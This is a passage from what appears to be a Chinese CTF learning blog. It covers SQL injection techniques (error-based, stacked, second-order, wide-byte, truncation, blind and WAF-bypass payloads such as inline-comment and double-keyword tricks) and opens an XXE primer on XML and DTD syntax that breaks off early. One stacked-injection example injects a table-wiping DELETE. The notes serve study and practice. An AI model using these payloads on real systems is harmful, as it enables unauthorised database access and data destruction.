&#x27; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+
</code></pre>

<p>其他同上</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入(!)"></a>堆叠注入(!)</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<pre><code class="highlight plaintext">堆叠注入中奇怪的知识点
1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)
设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。
</code></pre>

<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>在正常注册(假设账户名为admin)后登录，尝试修改密码，使用admin’#这个用户名修改却发现成功修改了admin的密码，这就说明存在二次注入的漏洞了</p>
<pre><code class="highlight plaintext">二次注入，实际上就是在注入数据之后，利用系统查询数据的用脏数据进行第二次的攻击，从而达到入侵数据库的目的</code></pre>

<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>一般来说，如果开发人员在开发的时候，对传入的参数进行了特殊的函数处理，比如使用了trim()函数，htmlspecialchars()函数，addlashes函数，是可以过滤我们非法提交的参数，从而导致SQL注入无法成功。</p>
<p>作为攻击者，要完成的是对参数的拼接，从而导致恶意的SQL语句写入。作为开发者要完成的是SQL输出参数的一个过滤比如对恶意的字符进行转移</p>
<h4 id="常用过滤函数"><a href="#常用过滤函数" class="headerlink" title="常用过滤函数"></a><strong>常用过滤函数</strong></h4><p><strong>trim()函数</strong><br>移除字符串两侧的空白字符或其他预定义字符<br><strong>htmlspecialchars()函数</strong><br>把预定义的字符”&lt;”和”&gt;”转换为HTML实体，预防XSS<br><strong>addslashes()函数</strong><br>返回在预定义字符之前添加反斜杠的字符串</p>
<pre><code class="highlight sql"># 预定义字符
<span class="number">1.</span>单引号(<span class="string">&#x27;)</span>
<span class="string">2.双引号(&quot;)</span>
<span class="string">3.反斜杠(\)</span>
<span class="string">4.NULL</span></code></pre>

<p>上述函数常在CMS里使用进行过滤</p>
<h4 id="宽字节注入条件"><a href="#宽字节注入条件" class="headerlink" title="宽字节注入条件"></a><strong>宽字节注入条件</strong></h4><p>1.数据库为GBK编码<br>2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符 \ 进行转义</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre><code class="highlight plaintext">root %df&#x27; or 1=1 #
# 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</code></pre>



<h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>在SQL执行字符串处理操作时，字符串末尾的空格符将会被删除，换句话说”user”是等同于”user     “的，对于绝大多数的情况这两个相等都是成立的(像WHERE子句的字符串和INSERT语句中的字符串)</p>
<blockquote>
<p>[!WARNING]</p>
<p>但是在像LIKE 子句中这是不成立的。因为对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在<a href="https://support.microsoft.com/en-in/kb/316626">内部</a>使用空格来填充字符串，以便在比较之前使其它们的长度保持一致</p>
</blockquote>
<p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”</p>
<p><strong>攻击手段</strong></p>
<p>注册一个用户名+一堆括号+1的用户名和自己的passwd(未超出长度限制的字符应该只包含已知的用户名和空白字符)</p>
<p>注:在查询时，SQL是不会将字符串截断的。因此，使用完整的字符串进行搜索，所以不会找到匹配的结果。但当执行INSERT查询语句时，它只会插入被限制长度的字符。</p>
<p>在攻击结束后，输入后来我们自己的密码和已给的用户名，会登录上原始用户</p>
<pre><code class="highlight plaintext">解决办法:
将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。

最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪

为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</code></pre>

<h3 id="Order-by注入"><a href="#Order-by注入" class="headerlink" title="Order by注入"></a>Order by注入</h3><h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>一般和盲注一起从出现，原因是大部分基础的查询已经被ban了(悲)</p>
<p>这里涉及到一个知识点，即Mysql的隐式转换，其实和PHP比较相像吧</p>
<pre><code class="highlight plaintext">Mysql的隐式转换
当字符串和数字进行算术计算时，字符串会被尝试转化为数字(如果可能)
例如&#x27;1&#x27;+1 会被解释为1+1
若不能成功转化(即字符串的首位不为数字),字符串就会被解释为0</code></pre>

<p>所以我们就可以通过异或式来辅助盲注(判断bool盲注的语句返回结果是否为真,帮助加长时间盲注的运算时间)</p>
<h2 id="Episode-3-在拿到flag的边缘疯狂试探-盲注"><a href="#Episode-3-在拿到flag的边缘疯狂试探-盲注" class="headerlink" title="Episode 3 在拿到flag的边缘疯狂试探:盲注"></a>Episode 3 在拿到flag的边缘疯狂试探:盲注</h2><p>(哈哈，盲注脚本吗，你问我，我只能说最好自己写一个，网上淘来的毕竟是别人的不如你自己搓的顺手)</p>
<p>先确定注入型，再用and连接一下</p>
<pre><code class="highlight sql">布尔盲注
<span class="number">1.</span> length(database())<span class="operator">&gt;</span>??? 初步判断
<span class="number">2.</span></code></pre>

<h2 id="Episode-4-注入点-猜猜我在哪里呢"><a href="#Episode-4-注入点-猜猜我在哪里呢" class="headerlink" title="Episode 4 注入点:&gt;猜猜我在哪里呢"></a>Episode 4 注入点:&gt;猜猜我在哪里呢</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h3 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h3><h3 id="Cookies注入"><a href="#Cookies注入" class="headerlink" title="Cookies注入"></a>Cookies注入</h3><h2 id="Episode-5-你好，绕WAF"><a href="#Episode-5-你好，绕WAF" class="headerlink" title="Episode   5  你好，绕WAF"></a>Episode   5  你好，绕WAF</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>如过过滤了and和AND，试试And</p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果waf把and替换为空</p>
<p>然后可以使用<code>anandd</code>绕过</p>
<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>&#x2F;**&#x2F;  注释符号</p>
<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>

<p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p>
<p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p>
<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p>
<h3 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h3><p>考虑管道符||表示or和&amp;&amp;表示and</p>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h3><p>改成like或者&lt;或者&gt;</p>
<p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p>
<ul>
<li>这里详细将一下正则的注入吧，感觉和正则沾上关系的都蛮不当人的</li>
</ul>
<p>正常的一个查询语句就像这样:</p>
<pre><code class="highlight sql"><span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span></code></pre>

<p>这里引用其他师傅打好的实例(<a href="https://ljdd520.github.io/2019/11/06/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">sql注入的知识总结 | L’s Blog</a>)</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250402210544627.png" alt="image-20250402210544627"></p>
<p>呃呃，怎么理解呢?就把regexp看成从^开始字符串与查询到的原串进行一个比较</p>
<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后
<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
#
<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行
#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行
<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>

<h3 id="比较符号-绕过"><a href="#比较符号-绕过" class="headerlink" title="比较符号(&lt; &gt;)绕过"></a>比较符号(&lt; &gt;)绕过</h3><p>一般是盲注要用到捏</p>
<p>最常见的一个盲注的sql语句：</p>
<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>

<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>

<h3 id="绕过关键字-union-select，where"><a href="#绕过关键字-union-select，where" class="headerlink" title="绕过关键字(union,select，where)"></a>绕过关键字(union,select，where)</h3><p>1）使用注释符绕过：</p>
<p>常用注释符：</p>
<p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p>
<p>用法：</p>
<p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
<p>2）使用大小写绕过：</p>
<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
<p>3）内联注释绕过：</p>
<p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
<p>4） 双关键字绕过：</p>
<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
<h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a>通用编码绕过</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
<p>or1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin()&#x3D;&#x3D;&gt;ascii()</p>
<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
<p>mid()、substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p>
<p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74或者：</p>
<p>substr((select’password’),1,1)&#x3D;0x70strcmp(left(‘password’,1),0x69)&#x3D;1strcmp(left(‘password’,1),0x70)&#x3D;0strcmp(left(‘password’,1),0x71)&#x3D;-1</p>
<h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><p>网页显示常常只能给出有限长度的字母，这个时候就要通过一些函数来绕过</p>
<pre><code class="highlight sql"><span class="number">1</span>、<span class="keyword">left</span>（<span class="number">201809</span>,<span class="number">4</span>）截取左边的<span class="number">4</span>个字符
<span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="number">201809</span>,<span class="number">4</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">2018</span>

<span class="number">2</span>、<span class="keyword">right</span>（name,<span class="number">2</span>）截取右边的<span class="number">2</span>个字符
<span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="number">201809</span>,<span class="number">2</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">09</span>

<span class="number">3</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">5</span>,<span class="number">3</span>) 截取name这个字段 从第五个字符开始 只截取之后的<span class="number">3</span>个字符
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：事业部

<span class="number">4</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">3</span>) 截取name这个字段 从第三个字符开始，之后的所有个字符
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：融资事业部

<span class="number">5</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，直到结束
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事业部

<span class="number">6</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>，<span class="number">2</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，只截取之后的<span class="number">2</span>个字符
<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>,<span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事
注意：我们注意到在函数 <span class="built_in">substring</span>(str,pos, len)中， pos 可以是负值，但 len 不能取负值。

<span class="number">7</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> 之前的所有字符
<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：www.baidu

<span class="number">8</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> （倒数）之后的所有字符
<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：baidu.com

<span class="number">9</span>、SUBSTR(name, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(name)<span class="number">-3</span>) 截取name字段，取除name字段后三位的所有字符
<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;成都融资事业部&#x27;</span>, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>)<span class="number">-3</span>)            <span class="operator">/</span><span class="operator">/</span>结果：成都融资

<span class="number">10</span>、mid(str,<span class="keyword">start</span>,[length])
str:截取的字符串   <span class="keyword">start</span>:起始位置   length:截取的长度，可以忽略
还可以这么构造:mid((str)<span class="keyword">from</span>(i)<span class="keyword">for</span>(<span class="number">1</span>)) #<span class="keyword">from</span>(<span class="number">1</span>)表示从第一个位置开始截取剩下的字符串，<span class="keyword">for</span>(<span class="number">1</span>)表示从改位置起一次就截取一个字符

<span class="number">11.</span>reverse(concat(<span class="number">0x3a</span>，(<span class="keyword">select</span>(group_concat(real_flag_1s_here))<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>))))
用reverse倒序输出，有时候有奇效。?大概吧
</code></pre>



<h2 id="Episode-6-模糊匹配"><a href="#Episode-6-模糊匹配" class="headerlink" title="Episode 6  模糊匹配"></a>Episode 6  模糊匹配</h2><p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p>
<p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p>
<p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p>
<p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p>
<p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p>
<p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p>
<p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p>
<p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p>
<h2 id="Episode-7-奇奇怪怪的知识点和一些技巧积累"><a href="#Episode-7-奇奇怪怪的知识点和一些技巧积累" class="headerlink" title="Episode   7 奇奇怪怪的知识点和一些技巧积累"></a>Episode   7 奇奇怪怪的知识点和一些技巧积累</h2><h3 id="短路算法："><a href="#短路算法：" class="headerlink" title="短路算法："></a><strong>短路算法：</strong></h3><p>|| 逻辑或的短路：a||b</p>
<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
<p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p>
<h3 id="WITH-ROLLUP-来自ctfshow-web10"><a href="#WITH-ROLLUP-来自ctfshow-web10" class="headerlink" title="WITH ROLLUP:(来自ctfshow web10)"></a><strong>WITH ROLLUP:</strong>(来自ctfshow web10)</h3><pre><code class="highlight plaintext">语法:group by xxx with rollup</code></pre>

<p>with rollup是对前面数据的一次汇总，此时在查询的数据中会被插入一行值为NULL,此时即可绕过长度检验，前提你要知道在哪个表并且没有对第二个字段是否输入的前端检查</p>
<h3 id="联合查询伪造"><a href="#联合查询伪造" class="headerlink" title="联合查询伪造"></a><strong>联合查询伪造</strong></h3><p>通过联合查询，你可以伪造一段没有的数据(即临时数据)</p>
<p>因为union select会把查询结果接在前一个查询结果后面，前面如果查到了东西，那么取得还是第一行</p>
<p>那么通过让前面查不到，回显我们的注入语句就能够达到注入目的(呃呃，感觉有点像二次注入的后面半段)</p>
<p>这里直接应用别的师傅打好的案例</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124245041.png" alt="image-20250330124245041"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124258559.png" alt="image-20250330124258559"></p>
<p>那么只要知道username所在的列就可以直接糊弄过密码的检测了</p>
<h3 id="注释和非注释闭合"><a href="#注释和非注释闭合" class="headerlink" title="注释和非注释闭合"></a>注释和非注释闭合</h3><p>众所周知，<code># --+</code>是为了注释掉后面的’</p>
<p>那我问你，如果注释符全被过滤了呢</p>
<p>诶，那就用到非注释闭合，就是在payload最后把–+这些换成and ‘1’&#x3D;’1</p>
<p>来达到正常注入不报错的目的</p>
<h2 id="Episode-8-一点感想"><a href="#Episode-8-一点感想" class="headerlink" title="Episode   8 一点感想"></a>Episode   8 一点感想</h2><p>刷了一些题目，发现最重要的其实是注入点的判断(除非是万恶的盲注，那重点可能更在脚本上)</p>
<p>[参考文章]: <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html">https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html</a>	“基于约束的SQL攻击 - Angel_Kitty - 博客园”<br>[参考文章]: <a href="https://www.cnblogs.com/icui4cu/p/15136893.html">https://www.cnblogs.com/icui4cu/p/15136893.html</a>	“宽字节注入原理及绕过方式”</p>
]]></content>
      <tags>
        <tag>-web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>初见XXE</title>
    <url>/2025/04/28/%E5%88%9D%E8%A7%81XXE/</url>
    <content><![CDATA[<h1 id="初见XXE"><a href="#初见XXE" class="headerlink" title="初见XXE"></a>初见XXE</h1><p>这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。</p>
<h2 id="什么是XML呢"><a href="#什么是XML呢" class="headerlink" title="什么是XML呢"></a>什么是XML呢</h2><p>XML，全称<strong>可扩展标记语言</strong>，XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。</p>
<p>XML文档结构包括XML声明+DTD文档类型定义+文档元素</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;
&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;
&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;
&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;
&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;
&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;
&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;
&lt;/book&gt;                                                 &lt;!--book的结束--&gt;
&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;</code></pre>

<p>其中<code>&lt;note&gt;</code>是根元素，每个XML文档必须包含一个根元素。</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p>
<p>standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p>
<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p><strong>DTD基本概念</strong><br>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br><strong>实体引用</strong><br>XML元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用<code>&lt; &gt; &amp; &#39; &quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code> 。<br>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。<br><strong>dtd的引入方式</strong><br>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br><em>内部 DTD</em><br>使用内部的dtd文件，即将约束规则定义在xml文档中</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</code></pre>

<p>示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;
&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;
]&gt;
&lt;note&gt;
&lt;to&gt;Y0u&lt;/to&gt;
&lt;from&gt;@re&lt;/from&gt;
&lt;head&gt;v3ry&lt;/head&gt;
&lt;body&gt;g00d!&lt;/body&gt;
&lt;/note&gt;</code></pre>

<p><em>外部 DTD</em><br>（1）引入外部的dtd文件</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</code></pre>

<p>（2）使用外部的dtd文件(网络上的dtd文件)</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;</code></pre>

<p>当使用外部DTD时，通过如下语法引入：</p>
<pre><code class="highlight plaintext">&lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt;</code></pre>

<p>示例代码：</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;
&lt;note&gt;
&lt;to&gt;Y0u&lt;/to&gt;
&lt;from&gt;@re&lt;/from&gt;
&lt;head&gt;v3ry&lt;/head&gt;
&lt;body&gt;g00d!&lt;/body&gt;
&lt;/note&gt;</code></pre>

<p>test.dtd</p>
<pre><code class="highlight plaintext">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</code></pre>

<p><strong>PCDATA</strong><br>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。<br>被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换。<br><strong>CDATA</strong><br>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。<br><strong>DTD元素</strong><br><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20191202150727-65e7882a-14d2-1.png" alt="img"><br><strong>DTD属性</strong><br><strong>属性声明语法</strong>：</p>
<pre><code class="highlight plaintext">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></pre>

<p>DTD实例：</p>
<pre><code class="highlight plaintext">&lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt;</code></pre>

<p>XML实例：</p>
